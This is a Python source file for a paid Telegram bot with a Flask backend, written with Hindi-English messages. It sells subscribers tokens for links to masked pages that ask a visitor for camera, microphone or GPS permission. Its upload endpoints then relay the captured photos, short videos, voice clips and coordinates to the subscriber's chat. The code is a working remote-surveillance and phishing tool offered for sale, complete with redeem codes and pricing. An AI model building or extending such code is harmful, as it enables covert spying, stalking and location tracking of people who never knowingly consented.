import io
import json
import os
import random
import string
import threading
from datetime import datetime, timedelta
from flask import Flask, request, render_template
from PIL import Image, ImageDraw
import telebot
from telebot import types

# ----------------- 1. CONFIGURATION & SETUP -----------------
with open("config.json", "r") as f:
    config = json.load(f)

BOT_TOKEN = config.get("bot_token")
ADMIN_ID = int(config.get("admin_id"))
OWNER_USERNAME = config.get("owner_username")
SERVER_URL = config.get("server_url")
CHANNELS = config.get("channels", [])
GROUP = config.get("group", {})

DEV_TAG = f"👨‍💻 Developer: @{OWNER_USERNAME}"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Flask(__name__)


# ----------------- 2. SAFE COLORED BUTTON HELPER -----------------
def kbtn(text, style=None):
    try:
        if style:
            return types.KeyboardButton(text, style=style)
        return types.KeyboardButton(text)
    except TypeError:
        btn = types.KeyboardButton(text)
        if style:
            setattr(btn, "style", style)
        return btn

# Main Menu Button Constants
BTN_CAMERA = "〖 ಠ〗𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_AUDIO = "♫︎  𝐀𝐮𝐝𝐢𝐨"
BTN_LOCATION = "༆ 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧"
BTN_PRICE = "𝐏𝐫𝐢𝐜𝐞 ?"
BTN_REDEEM = "✍︎ 𝐑𝐞𝐝𝐞𝐞𝐦 𝐂𝐨𝐝𝐞"
BTN_BALANCE = "✔︎ 𝐌𝐲 𝐁𝐚𝐥𝐚𝐧𝐜𝐞"
BTN_PAGE = "𖠌 𝐏𝐞𝐠𝐞"
BTN_ADMIN = "♕︎ 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐧𝐞𝐥"

# Camera Sub-Menu Button Constants
BTN_FRONT_CAM = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_BACK_CAM = "〖 ಠ〗𝐁𝐚𝐜𝐤 𝐂𝐚𝐦𝐞𝐫𝐚"
BTN_FRONT_VID = "〖 ಠ〗𝐅𝐫𝐨𝐧𝐭 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_VID = "〖 ಠ〗𝐁𝐚𝐜𝐤 8𝐬 𝐕𝐢𝐝𝐞𝐨"
BTN_BACK_HOME = "⌫  𝐁𝐚𝐜𝐤 𝐓𝐨 𝐇𝐨𝐦𝐞"

# Admin Panel Button Constants
BTN_GEN_REDEEM = "✍︎ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐑𝐞𝐝𝐞𝐞𝐦"
BTN_USER_ACTIVITY = "㋛︎ 𝐔𝐬𝐞𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲"
BTN_USER_PLAN = "シ︎ 𝐔𝐬𝐞𝐫 𝐏𝐥𝐚𝐧"
BTN_ACTIVATE_PLAN = "✈︎ 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞 𝐏𝐥𝐚𝐧"


# ----------------- 3. DATABASE MANAGEMENT -----------------
def load_db():
    try:
        with open("database.json", "r") as f:
            return json.load(f)
    except Exception:
        return {"users": {}, "redeem_codes": {}}

def save_db(db):
    with open("database.json", "w") as f:
        json.dump(db, f, indent=4)

def get_user_data(user):
    db = load_db()
    uid = str(user.id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "tokens": 0,
            "plan": "free",
            "expiry": None,
            "username": f"@{user.username}" if user.username else "No Username",
            "name": user.first_name
        }
        save_db(db)
    return db["users"][uid]

def has_active_plan(uid):
    if int(uid) == ADMIN_ID:
        return True

    db = load_db()
    user = db["users"].get(str(uid))
    if not user:
        return False

    if user.get("plan") == "unlimited":
        if user.get("expiry") is None:
            return True
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp:
            return True

    if user.get("tokens", 0) > 0:
        return True

    return False

def deduct_token(uid):
    if int(uid) == ADMIN_ID:
        return

    db = load_db()
    user = db["users"].get(str(uid))
    if user and user.get("plan") != "unlimited":
        user["tokens"] = max(0, user.get("tokens", 0) - 1)
        save_db(db)


# ----------------- 4. FORCE JOIN VERIFICATION -----------------
def is_user_joined(user_id):
    if int(user_id) == ADMIN_ID:
        return True

    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch["username"], user_id)
            if member.status not in ['creator', 'administrator', 'member', 'restricted']:
                return False
        except Exception:
            return False

    try:
        member = bot.get_chat_member(GROUP["username"], user_id)
        if member.status not in ['creator', 'administrator', 'member', 'restricted']:
            return False
    except Exception:
        return False

    return True

def get_force_join_markup():
    markup = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        markup.add(types.InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"]))
    markup.add(types.InlineKeyboardButton(f"👥 Join {GROUP['name']}", url=GROUP["url"]))
    markup.add(types.InlineKeyboardButton("✅ Check / Verified", callback_data="check_join"))
    return markup


# ----------------- 5. KEYBOARDS WITH COLOR STYLES -----------------
def get_main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        kbtn(BTN_CAMERA, "primary"),
        kbtn(BTN_AUDIO, "primary")
    )
    markup.add(
        kbtn(BTN_LOCATION, "primary"),
        kbtn(BTN_PRICE, "success")
    )
    markup.add(
        kbtn(BTN_REDEEM, "primary"),
        kbtn(BTN_BALANCE, "success")
    )
    markup.add(
        kbtn(BTN_PAGE, "primary")
    )
    if int(user_id) == ADMIN_ID:
        markup.add(kbtn(BTN_ADMIN, "danger"))
    return markup

def get_camera_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        kbtn(BTN_FRONT_CAM, "primary"),
        kbtn(BTN_BACK_CAM, "primary")
    )
    markup.add(
        kbtn(BTN_FRONT_VID, "primary"),
        kbtn(BTN_BACK_VID, "primary")
    )
    markup.add(kbtn(BTN_BACK_HOME, "danger"))
    return markup

def get_admin_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        kbtn(BTN_GEN_REDEEM, "success"),
        kbtn(BTN_USER_ACTIVITY, "primary")
    )
    markup.add(
        kbtn(BTN_USER_PLAN, "primary"),
        kbtn(BTN_ACTIVATE_PLAN, "primary")
    )
    markup.add(kbtn(BTN_BACK_HOME, "danger"))
    return markup

def get_redeem_type_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        kbtn("VIP", "success"),
        kbtn("Normal", "primary")
    )
    markup.add(kbtn(BTN_BACK_HOME, "danger"))
    return markup


# ----------------- 6. CIRCULAR AVATAR GENERATOR -----------------
def make_circular_avatar(avatar_img, size=(130, 130), border_color="#2ECC71", border_width=5):
    avatar_img = avatar_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")
    mask = Image.new("L", size, 0)
    draw_mask = ImageDraw.Draw(mask)
    draw_mask.ellipse((0, 0, size[0], size[1]), fill=255)

    circular = Image.new("RGBA", size, (0, 0, 0, 0))
    circular.paste(avatar_img, (0, 0), mask=mask)

    draw_border = ImageDraw.Draw(circular)
    draw_border.ellipse(
        (border_width // 2, border_width // 2, size[0] - border_width // 2, size[1] - border_width // 2),
        outline=border_color,
        width=border_width
    )
    return circular


# ----------------- 7. CORE BOT HANDLERS -----------------
def send_home_dashboard(chat_id, user):
    get_user_data(user)
    bot_name = bot.get_me().first_name

    welcome_text = (
        f"<blockquote>"
        f"Welcome to {bot_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Name : {user.first_name}\n"
        f"UID: {user.id}\n"
        f"Username: @{user.username if user.username else 'N/A'}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{DEV_TAG}"
        f"</blockquote>"
    )

    markup = get_main_menu(user.id)
    user_photos = bot.get_user_profile_photos(user.id)

    try:
        banner = Image.open("banner.png").convert("RGBA")
        if user_photos.total_count > 0:
            file_id = user_photos.photos[0][-1].file_id
            file_info = bot.get_file(file_id)
            downloaded = bot.download_file(file_info.file_path)
            avatar = make_circular_avatar(Image.open(io.BytesIO(downloaded)))
            banner.paste(avatar, (30, 30), avatar)

        buf = io.BytesIO()
        banner.convert("RGB").save(buf, format="JPEG", quality=95)
        buf.seek(0)
        bot.send_photo(chat_id, photo=buf, caption=welcome_text, reply_markup=markup)
    except Exception:
        bot.send_message(chat_id, welcome_text, reply_markup=markup)

@bot.message_handler(commands=['start'])
def handle_start(message):
    user = message.from_user
    if not is_user_joined(user.id):
        force_msg = (
            f"<blockquote>"
            f"⚠️ <b>Access Denied!</b>\n\n"
            f"Bot use karne ke liye aapko hamare Channels aur Group ko join karna zaroori hai.\n\n"
            f"Join karne ke baad <b>'Check / Verified'</b> button par click karein.\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, force_msg, reply_markup=get_force_join_markup())
        return
    send_home_dashboard(message.chat.id, user)

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def verify_join_callback(call):
    if is_user_joined(call.from_user.id):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        send_home_dashboard(call.message.chat.id, call.from_user)
    else:
        bot.answer_callback_query(call.id, "❌ Aapne abhi tak sabhi channels/group join nahi kiye!", show_alert=True)


# --- MY BALANCE HANDLER ---
@bot.message_handler(func=lambda m: m.text == BTN_BALANCE)
def handle_my_balance(message):
    uid = str(message.from_user.id)
    db = load_db()
    user = db["users"].get(uid)

    if int(uid) == ADMIN_ID:
        balance_msg = (
            f"<blockquote>"
            f"Activate VIP Lifetime ✅\n"
            f"Token : unlimited\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, balance_msg)
        return

    if not user:
        balance_msg = (
            f"<blockquote>"
            f"Not activate VIP ❌\n"
            f"Token : 0\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, balance_msg)
        return

    if user.get("plan") == "unlimited" and user.get("expiry"):
        exp = datetime.strptime(user["expiry"], "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp:
            rem_days = max(1, (exp - datetime.now()).days + 1)
            balance_msg = (
                f"<blockquote>"
                f"Activate VIP {rem_days}d ✅\n"
                f"Token : unlimited\n"
                f"{DEV_TAG}"
                f"</blockquote>"
            )
            bot.send_message(message.chat.id, balance_msg)
            return

    tokens = user.get("tokens", 0)
    balance_msg = (
        f"<blockquote>"
        f"Not activate VIP ❌\n"
        f"Token : {tokens}\n"
        f"{DEV_TAG}"
        f"</blockquote>"
    )
    bot.send_message(message.chat.id, balance_msg)


# --- PRICE & BUY FLOW (REDIRECT TO @GOD_AYUSH) ---
def send_price_menu(chat_id):
    price_text = (
        f"<blockquote>"
        f"5 token ₹10\n"
        f"10 token ₹15\n"
        f"30 token ₹55\n"
        f"100 token ₹80\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Unlimited 3 deys ₹30\n"
        f"Unlimited 7 deys ₹60\n"
        f"Unlimited 30 deys ₹200\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Bye karne ke liye mujhe massage karna hoga\n"
        f"{DEV_TAG}"
        f"</blockquote>"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("bye subscription", url="https://t.me/Ayush_Hackz"))
    bot.send_message(chat_id, price_text, reply_markup=markup, disable_web_page_preview=True)

@bot.message_handler(func=lambda m: m.text == BTN_PRICE)
def handle_price_btn(message):
    send_price_menu(message.chat.id)


# --- CAMERA SUB-MENU & LINK GENERATORS (MASKED ROUTES: Ayush-wab) ---
@bot.message_handler(func=lambda m: m.text == BTN_CAMERA)
def handle_camera_options(message):
    bot.send_message(
        message.chat.id,
        f"<blockquote>📷 <b>Camera Options:</b>\nNiche diye gaye options me se select karein.\n{DEV_TAG}</blockquote>",
        reply_markup=get_camera_menu()
    )

def handle_media_request(message, endpoint, label):
    uid = message.from_user.id
    if not has_active_plan(uid):
        no_sub = (
            f"<blockquote>"
            f"⚠️ <b>Aap ke pass koi subscription nahi hai</b>\n\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, no_sub, disable_web_page_preview=True)
        send_price_menu(message.chat.id)
        return

    deduct_token(uid)
    link = f"{SERVER_URL}/{endpoint}?chat_id={message.chat.id}"
    bot.send_message(
        message.chat.id,
        f"<blockquote>"
        f"🔗 <b>{label} Link Generated:</b>\n\n"
        f"{link}\n\n"
        f"⚠️ Is link ko open karein aur permission allow karein.\n"
        f"{DEV_TAG}"
        f"</blockquote>",
        disable_web_page_preview=True
    )

@bot.message_handler(func=lambda m: m.text == BTN_FRONT_CAM)
def front_cam(m): handle_media_request(m, "Ayush-wab", "Front Camera")

@bot.message_handler(func=lambda m: m.text == BTN_BACK_CAM)
def back_cam(m): handle_media_request(m, "Ayush-wab-1", "Back Camera")

@bot.message_handler(func=lambda m: m.text == BTN_FRONT_VID)
def front_vid(m): handle_media_request(m, "Ayush-wab-2", "Front 8s Video")

@bot.message_handler(func=lambda m: m.text == BTN_BACK_VID)
def back_vid(m): handle_media_request(m, "Ayush-wab-3", "Back 8s Video")


# --- AUDIO & LOCATION HANDLERS (MASKED ROUTES: Ayush-wab) ---
@bot.message_handler(func=lambda m: m.text == BTN_AUDIO)
def handle_audio_btn(message):
    uid = message.from_user.id
    if not has_active_plan(uid):
        no_sub = (
            f"<blockquote>"
            f"⚠️ <b>Aap ke pass koi subscription nahi hai</b>\n\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, no_sub, disable_web_page_preview=True)
        send_price_menu(message.chat.id)
        return

    deduct_token(uid)
    link = f"{SERVER_URL}/Ayush-wab-4?chat_id={message.chat.id}"
    bot.send_message(
        message.chat.id,
        f"<blockquote>"
        f"🔗 <b>Audio Recording Link:</b>\n\n"
        f"{link}\n\n"
        f"⚠️ Link open karte hi mic permission allow karein. Voice clips bot par aane lagenge.\n"
        f"{DEV_TAG}"
        f"</blockquote>",
        disable_web_page_preview=True
    )

@bot.message_handler(func=lambda m: m.text == BTN_LOCATION)
def handle_location_btn(message):
    uid = message.from_user.id
    if not has_active_plan(uid):
        no_sub = (
            f"<blockquote>"
            f"⚠️ <b>Aap ke pass koi subscription nahi hai</b>\n\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, no_sub, disable_web_page_preview=True)
        send_price_menu(message.chat.id)
        return

    deduct_token(uid)
    link = f"{SERVER_URL}/Ayush-wab-5?chat_id={message.chat.id}"
    bot.send_message(
        message.chat.id,
        f"<blockquote>"
        f"🔗 <b>Live Location Link:</b>\n\n"
        f"{link}\n\n"
        f"⚠️ Link open karke location permission allow karein. Aapki GPS location bot par send hogi.\n"
        f"{DEV_TAG}"
        f"</blockquote>",
        disable_web_page_preview=True
    )


# --- NAVIGATION & PAGES ---
@bot.message_handler(func=lambda m: m.text in [BTN_BACK_HOME, "Back to home", "⌫ Back To Home"])
def nav_home(m):
    send_home_dashboard(m.chat.id, m.from_user)

@bot.message_handler(func=lambda m: m.text == BTN_PAGE)
def nav_page(m):
    bot.reply_to(m, f"<blockquote>🚧 <b>Coming soon</b>\n{DEV_TAG}</blockquote>")


# --- USER REDEEM CODE FLOW (ONE-TIME PER USER CHECK) ---
@bot.message_handler(func=lambda m: m.text == BTN_REDEEM)
def ask_user_redeem_code(message):
    msg = bot.send_message(
        message.chat.id,
        f"<blockquote>Apna redeem code send karo\n{DEV_TAG}</blockquote>"
    )
    bot.register_next_step_handler(msg, process_user_redeem_input)

def process_user_redeem_input(message):
    all_nav_buttons = [
        BTN_BACK_HOME, BTN_CAMERA, BTN_AUDIO, BTN_LOCATION, BTN_PRICE, 
        BTN_REDEEM, BTN_BALANCE, BTN_PAGE, BTN_ADMIN, "Back to home"
    ]
    if message.text in all_nav_buttons:
        send_home_dashboard(message.chat.id, message.from_user)
        return

    code = message.text.strip()
    db = load_db()

    if code in db.get("redeem_codes", {}):
        rc = db["redeem_codes"][code]
        if "used_by" not in rc:
            rc["used_by"] = []

        uid = str(message.from_user.id)

        if uid in rc["used_by"]:
            bot.reply_to(
                message, 
                f"<blockquote>❌ <b>Aap is redeem code ko pehle hi use kar chuke hain!</b>\nEk code ko sirf ek baar use kiya ja sakta hai.\n{DEV_TAG}</blockquote>"
            )
            return

        if rc.get("uses_left", 0) > 0:
            user = db["users"].get(uid)
            if not user:
                user = get_user_data(message.from_user)

            if rc["type"] == "token":
                tokens_added = rc["value"]
                user["tokens"] = user.get("tokens", 0) + tokens_added
                res_text = f"Successfully {tokens_added} token"
            else:
                days_added = rc["days"]
                user["plan"] = "unlimited"
                user["expiry"] = (datetime.now() + timedelta(days=days_added)).strftime("%Y-%m-%d %H:%M:%S")
                res_text = f"Successfully VIP activete {days_added}d unlimited token"

            rc["used_by"].append(uid)
            rc["uses_left"] -= 1

            if rc["uses_left"] <= 0:
                del db["redeem_codes"][code]
            save_db(db)

            bot.reply_to(message, f"<blockquote>{res_text}\n{DEV_TAG}</blockquote>")
            return

    bot.reply_to(message, f"<blockquote>❌ Invalid ya Expired Redeem Code!\n{DEV_TAG}</blockquote>")


# ----------------- 8. ADMIN PANEL ACTIONS -----------------
@bot.message_handler(func=lambda m: m.text == BTN_ADMIN)
def admin_panel_open(message):
    if int(message.from_user.id) != ADMIN_ID:
        return
    bot.send_message(
        message.chat.id,
        f"<blockquote>⚙️ <b>Admin Control Panel:</b>\nNiche se option select karein.\n{DEV_TAG}</blockquote>",
        reply_markup=get_admin_menu()
    )

@bot.message_handler(func=lambda m: m.text == BTN_USER_ACTIVITY)
def admin_user_activity(message):
    if int(message.from_user.id) != ADMIN_ID:
        return
    db = load_db()
    users = db.get("users", {})
    text = f"<blockquote>👥 <b>Registered Users: {len(users)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in list(users.items())[-15:]:
        text += f"• <b>Name:</b> {data.get('name', 'N/A')} | <b>UID:</b> <code>{uid}</code> | <b>User:</b> {data.get('username', 'N/A')}\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda m: m.text == BTN_USER_PLAN and int(m.from_user.id) == ADMIN_ID)
def admin_user_plan_view(message):
    db = load_db()
    users = db.get("users", {})
    text = f"<blockquote>📋 <b>Users Plan Details:</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    now = datetime.now()
    count = 0

    for uid, data in list(users.items())[-20:]:
        count += 1
        name = data.get("name", "N/A")
        uname = data.get("username", "N/A")
        plan_type = data.get("plan", "free")
        expiry = data.get("expiry")
        tokens = data.get("tokens", 0)

        status_str = ""
        if int(uid) == ADMIN_ID:
            status_str = "👑 Lifetime Admin VIP"
        elif plan_type == "unlimited" and expiry:
            exp_dt = datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S")
            if now < exp_dt:
                days_left = max(1, (exp_dt - now).days + 1)
                status_str = f"👑 VIP ({days_left}d bache hain)"
            else:
                status_str = f"⚠️ Expired VIP | Tokens: {tokens}"
        elif tokens > 0:
            status_str = f"🪙 Normal Plan ({tokens} Tokens)"
        else:
            status_str = "❌ Free / No Active Plan"

        text += f"• <b>{name}</b> ({uname})\n  └ UID: <code>{uid}</code>\n  └ Status: <b>{status_str}</b>\n\n"

    if count == 0:
        text += "Koi registered user nahi mila.\n"

    text += f"{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

# --- ADMIN REDEEM CODE GENERATION FLOW (PREFIX: AYUSH-) ---
@bot.message_handler(func=lambda m: m.text == BTN_GEN_REDEEM and int(m.from_user.id) == ADMIN_ID)
def admin_generate_redeem_start(message):
    bot.send_message(
        message.chat.id,
        f"<blockquote>VIP banana chahte hain ya normal\n{DEV_TAG}</blockquote>",
        reply_markup=get_redeem_type_menu()
    )

# NORMAL FLOW
@bot.message_handler(func=lambda m: m.text == "Normal" and int(m.from_user.id) == ADMIN_ID)
def admin_normal_ask_users(message):
    msg = bot.send_message(
        message.chat.id,
        f"<blockquote>kitne user ke liye banana chahte ho\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove()
    )
    bot.register_next_step_handler(msg, admin_normal_ask_tokens)

def admin_normal_ask_tokens(message):
    if message.text in [BTN_BACK_HOME, "Back to home"]:
        send_home_dashboard(message.chat.id, message.from_user)
        return
    try:
        users_count = int(message.text.strip())
        msg = bot.send_message(
            message.chat.id,
            f"<blockquote>kitne token\n{DEV_TAG}</blockquote>"
        )
        bot.register_next_step_handler(msg, admin_normal_create_code, users_count)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Kripya sahi number bhejein!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

def admin_normal_create_code(message, users_count):
    try:
        tokens_count = int(message.text.strip())
        code_rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        code = f"AYUSH-{code_rand}"

        db = load_db()
        db["redeem_codes"][code] = {
            "type": "token",
            "value": tokens_count,
            "uses_left": users_count,
            "used_by": []
        }
        save_db(db)

        out_msg = (
            f"<blockquote>"
            f"redeem code: <code>{code}</code>\n"
            f"User : {users_count}\n"
            f"Token : {tokens_count}\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, out_msg, reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Kripya sahi number bhejein!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

# VIP FLOW
@bot.message_handler(func=lambda m: m.text == "VIP" and int(m.from_user.id) == ADMIN_ID)
def admin_vip_ask_users(message):
    msg = bot.send_message(
        message.chat.id,
        f"<blockquote>kitne user\n{DEV_TAG}</blockquote>",
        reply_markup=types.ReplyKeyboardRemove()
    )
    bot.register_next_step_handler(msg, admin_vip_ask_days)

def admin_vip_ask_days(message):
    if message.text in [BTN_BACK_HOME, "Back to home"]:
        send_home_dashboard(message.chat.id, message.from_user)
        return
    try:
        users_count = int(message.text.strip())
        msg = bot.send_message(
            message.chat.id,
            f"<blockquote>kitne din ke liye\n{DEV_TAG}</blockquote>"
        )
        bot.register_next_step_handler(msg, admin_vip_create_code, users_count)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Kripya sahi number bhejein!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())

def admin_vip_create_code(message, users_count):
    try:
        days_count = int(message.text.strip())
        code_rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        code = f"AYUSH-{code_rand}"

        db = load_db()
        db["redeem_codes"][code] = {
            "type": "unlimited",
            "days": days_count,
            "uses_left": users_count,
            "used_by": []
        }
        save_db(db)

        out_msg = (
            f"<blockquote>"
            f"redeem code: <code>{code}</code>\n"
            f"User : {users_count}\n"
            f"Deys : {days_count}\n"
            f"Token : unlimited\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        bot.send_message(message.chat.id, out_msg, reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Kripya sahi number bhejein!\n{DEV_TAG}</blockquote>", reply_markup=get_admin_menu())


# --- ADMIN DIRECT COMMANDS ---
@bot.message_handler(func=lambda m: m.text == BTN_ACTIVATE_PLAN and int(m.from_user.id) == ADMIN_ID)
def admin_activate_plan_info(message):
    info = (
        f"<blockquote>"
        f"⚡ <b>Direct Plan Activation Commands:</b>\n\n"
        f"1. <b>Single User VIP Plan:</b>\n<code>/setvip UID DAYS</code>\n(Permanent ke liye 36500 days dalein)\n\n"
        f"2. <b>Single User Tokens:</b>\n<code>/addtokens UID TOKENS</code>\n\n"
        f"3. <b>All Users VIP Plan:</b>\n<code>/broadcast_vip DAYS</code>\n"
        f"{DEV_TAG}"
        f"</blockquote>"
    )
    bot.send_message(message.chat.id, info)

@bot.message_handler(commands=['setvip'])
def set_vip_cmd(message):
    if int(message.from_user.id) != ADMIN_ID:
        return
    try:
        _, target_uid, days = message.text.split()
        db = load_db()
        if target_uid in db["users"]:
            db["users"][target_uid]["plan"] = "unlimited"
            db["users"][target_uid]["expiry"] = (datetime.now() + timedelta(days=int(days))).strftime("%Y-%m-%d %H:%M:%S")
            save_db(db)
            bot.reply_to(message, f"<blockquote>✅ UID <code>{target_uid}</code> ko {days} din ka VIP Plan mil gaya!\n{DEV_TAG}</blockquote>")
        else:
            bot.reply_to(message, f"<blockquote>❌ User database me nahi mila!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/setvip UID DAYS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(commands=['addtokens'])
def add_tokens_cmd(message):
    if int(message.from_user.id) != ADMIN_ID:
        return
    try:
        _, target_uid, tokens = message.text.split()
        db = load_db()
        if target_uid in db["users"]:
            db["users"][target_uid]["tokens"] = db["users"][target_uid].get("tokens", 0) + int(tokens)
            save_db(db)
            bot.reply_to(message, f"<blockquote>✅ UID <code>{target_uid}</code> me {tokens} Tokens add kar diye gaye!\n{DEV_TAG}</blockquote>")
        else:
            bot.reply_to(message, f"<blockquote>❌ User database me nahi mila!\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/addtokens UID TOKENS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(commands=['broadcast_vip'])
def broadcast_vip_cmd(message):
    if int(message.from_user.id) != ADMIN_ID:
        return
    try:
        _, days = message.text.split()
        days = int(days)
        db = load_db()
        for uid in db["users"]:
            db["users"][uid]["plan"] = "unlimited"
            db["users"][uid]["expiry"] = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
        save_db(db)
        bot.reply_to(message, f"<blockquote>🎉 <b>Sabhi Users ko {days} dino ka VIP Plan de diya gaya!</b>\n{DEV_TAG}</blockquote>")
    except Exception:
        bot.reply_to(message, f"<blockquote>Usage: <code>/broadcast_vip DAYS</code>\n{DEV_TAG}</blockquote>")


# ----------------- 9. FLASK SERVER ENDPOINTS (Ayush-wab URLs) -----------------
@app.route('/Ayush-wab')
def route_front(): return render_template('Front_camera.html')

@app.route('/Ayush-wab-1')
def route_back(): return render_template('Back_camera.html')

@app.route('/Ayush-wab-2')
def route_f8s(): return render_template('Front_8s.html')

@app.route('/Ayush-wab-3')
def route_b8s(): return render_template('Back_8s.html')

@app.route('/Ayush-wab-4')
def route_audio(): return render_template('Audio.html')

@app.route('/Ayush-wab-5')
def route_location(): return render_template('Location.html')

@app.route('/upload_media', methods=['POST'])
def receive_media():
    chat_id = request.form.get('chat_id')
    media_type = request.form.get('type')
    file = request.files.get('file')

    if chat_id and file:
        data = file.read()
        caption = f"<blockquote>✅ <b>Auto Captured Media Saved!</b>\n{DEV_TAG}</blockquote>"
        try:
            if media_type == 'photo':
                bot.send_photo(chat_id=chat_id, photo=data, caption=caption)
            elif media_type == 'video':
                bot.send_video(chat_id=chat_id, video=data, caption=caption)
            elif media_type == 'audio':
                bot.send_voice(chat_id=chat_id, voice=data, caption=caption)
            return "OK", 200
        except Exception as e:
            print("Media Send Error:", e)
            return "ERROR", 500
    return "FAIL", 400

@app.route('/upload_location', methods=['POST'])
def receive_location():
    chat_id = request.form.get('chat_id')
    lat = request.form.get('latitude')
    lon = request.form.get('longitude')
    acc = request.form.get('accuracy')

    if chat_id and lat and lon:
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        loc_text = (
            f"<blockquote>"
            f"📍 <b>Live Location Received!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>Latitude:</b> <code>{lat}</code>\n"
            f"🌐 <b>Longitude:</b> <code>{lon}</code>\n"
            f"🎯 <b>Accuracy:</b> {acc} meters\n"
            f"🗺️ <b>Google Maps:</b> <a href='{maps_url}'>Click to View</a>\n"
            f"{DEV_TAG}"
            f"</blockquote>"
        )
        try:
            bot.send_location(chat_id=chat_id, latitude=float(lat), longitude=float(lon))
            bot.send_message(chat_id=chat_id, text=loc_text, disable_web_page_preview=False)
            return "OK", 200
        except Exception as e:
            print("Location Send Error:", e)
            return "ERROR", 500
    return "FAIL", 400


# ----------------- 10. RUN APPLICATION -----------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)).start()
    print(f"Flask Server Port {port} par start ho gaya...")
    print("Bot polling chalu ho gayi hai...")
    bot.infinity_polling()